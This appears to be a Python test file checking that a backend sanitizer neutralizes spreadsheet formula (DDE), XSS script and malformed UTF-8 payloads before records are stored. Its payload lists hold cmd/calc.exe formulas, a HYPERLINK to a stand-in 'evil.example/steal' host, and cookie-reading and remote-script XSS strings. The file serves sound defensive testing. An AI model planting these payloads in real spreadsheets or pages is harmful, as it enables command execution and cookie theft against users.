"""Security tests: spreadsheet formula, executable script, and malformed UTF-8 injection.

Covers three classic CSV/spreadsheet attack payload classes and verifies the
backend sanitizer neutralizes them before any string reaches Firestore.
"""
from uuid import uuid4

from fastapi.testclient import TestClient

from csv_injection_sanitizer import (
    FORMULA_TRIGGER_CHARS,
    sanitize_cell_value,
    sanitize_formula_injection,
    sanitize_malformed_utf8,
    sanitize_record,
    sanitize_script_injection,
)
from database import db
from main import app
from record_merge_service import merge_record_cluster

client = TestClient(app)

FORMULA_PAYLOADS = [
    "=cmd|' /C calc.exe'!A1",
    "+HYPERLINK(\"http://evil.example/steal\",\"click me\")",
    "-2+3+cmd|' /C calc.exe'!A1",
    "@SUM(1+1)*cmd|' /C calc.exe'!A1",
    "\t=cmd|' /C calc.exe'!A1",
    "\r=cmd|' /C calc.exe'!A1",
]

SCRIPT_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(document.cookie)",
    "<SCRIPT SRC=http://evil.example/x.js></SCRIPT>",
]


# ── Formula / DDE injection ──────────────────────────────────────────────────

def test_sanitize_formula_injection_strips_leading_trigger_characters():
    for payload in FORMULA_PAYLOADS:
        cleaned = sanitize_formula_injection(payload.strip("\t\r"))
        assert not cleaned.startswith(FORMULA_TRIGGER_CHARS)


def test_sanitize_cell_value_neutralizes_cmd_exec_formula():
    cleaned = sanitize_cell_value("=cmd|' /C calc.exe'!A1")
    assert cleaned == "cmd|' /C calc.exe'!A1"
    assert not cleaned.startswith("=")


def test_sanitize_cell_value_passes_through_non_string_values():
    assert sanitize_cell_value(42) == 42
    assert sanitize_cell_value(3.14) == 3.14
    assert sanitize_cell_value(True) is True
    assert sanitize_cell_value(None) is None


# ── Executable script injection ──────────────────────────────────────────────

def test_sanitize_script_injection_strips_script_tags_and_handlers():
    assert "<script" not in sanitize_script_injection(SCRIPT_PAYLOADS[0]).lower()
    assert "onerror=" not in sanitize_script_injection(SCRIPT_PAYLOADS[1]).lower()
    assert "javascript:" not in sanitize_script_injection(SCRIPT_PAYLOADS[2]).lower()
    assert "<script" not in sanitize_script_injection(SCRIPT_PAYLOADS[3]).lower()


# ── Malformed UTF-8 ───────────────────────────────────────────────────────────

def test_sanitize_malformed_utf8_handles_invalid_bytes():
    corrupted = b"Dr. Corrupt \xff\xfe Name"
    cleaned = sanitize_malformed_utf8(corrupted)
    assert isinstance(cleaned, str)
    cleaned.encode("utf-8")  # must not raise


def test_sanitize_malformed_utf8_handles_lone_surrogates():
    corrupted = "Dr. Corrupt \udcff Name"
    cleaned = sanitize_malformed_utf8(corrupted)
    cleaned.encode("utf-8")  # must not raise


def test_sanitize_record_cleans_every_field():
    record = {
        "first_name": "=cmd|' /C calc.exe'!A1",
        "last_name": "<script>alert(1)</script>",
        "npi": "1234567890",
        "opted_in": True,
    }
    cleaned = sanitize_record(record)
    assert cleaned["first_name"] == "cmd|' /C calc.exe'!A1"
    assert "<script" not in cleaned["last_name"].lower()
    assert cleaned["npi"] == "1234567890"
    assert cleaned["opted_in"] is True


# ── Integration: merge_record_cluster sanitizes before Firestore writes ─────

def test_merge_record_cluster_sanitizes_formula_and_script_payloads():
    records = [
        {
            "record_id": "r1",
            "npi": "1234567890",
            "first_name": "=cmd|' /C calc.exe'!A1",
            "last_name": "<script>alert(1)</script>",
            "notes": "@SUM(1+1)*cmd|' /C calc.exe'!A1",
        },
    ]

    merged = merge_record_cluster(records)
    master = merged["master_record"]

    assert not master["first_name"].startswith(FORMULA_TRIGGER_CHARS)
    assert "<script" not in master["last_name"].lower()
    assert not master["notes"].startswith(FORMULA_TRIGGER_CHARS)


# ── End-to-end: injected records persisted via the API never reach Firestore
#    with an executable leading formula character ──────────────────────────

def test_records_merge_endpoint_sanitizes_formula_before_firestore_write():
    company_id = f"test-injection-{uuid4()}"
    payload = {
        "records": [
            {
                "record_id": "r1",
                "npi": "1234567890",
                "first_name": "=cmd|' /C calc.exe'!A1",
                "last_name": "Doe",
                "bio": "<script>alert('xss')</script>",
            },
        ],
    }

    response = client.post(
        f"/api/companies/{company_id}/records/merge",
        json=payload,
        headers={"X-User-Role": "admin"},
    )

    assert response.status_code == 200, response.text
    data = response.json()
    assert not data["merged_record"]["first_name"].startswith(FORMULA_TRIGGER_CHARS)
    assert "<script" not in data["merged_record"]["bio"].lower()

    persisted = (
        db.collection("companies")
        .document(company_id)
        .collection("records")
        .document("r1")
        .get()
        .to_dict()
    )
    assert persisted["first_name"] == "cmd|' /C calc.exe'!A1"
    assert not persisted["first_name"].startswith(FORMULA_TRIGGER_CHARS)
    assert "<script" not in persisted["bio"].lower()


# ── Malformed UTF-8 upload is rejected at the file-upload boundary ──────────

def test_upload_file_rejects_malformed_utf8_csv():
    company_id = f"test-injection-utf8-{uuid4()}"
    corrupted_csv = b"npi,first_name,last_name\n1234567890,Corrupt\xff\xfeName,Doe\n"

    response = client.post(
        f"/api/companies/{company_id}/upload_file",
        files={"file": ("corrupt.csv", corrupted_csv, "text/csv")},
        headers={"X-User-Role": "editor"},
    )

    assert response.status_code == 400
    detail = response.json()["detail"]
    assert detail["error"] == "Malformed CSV upload"
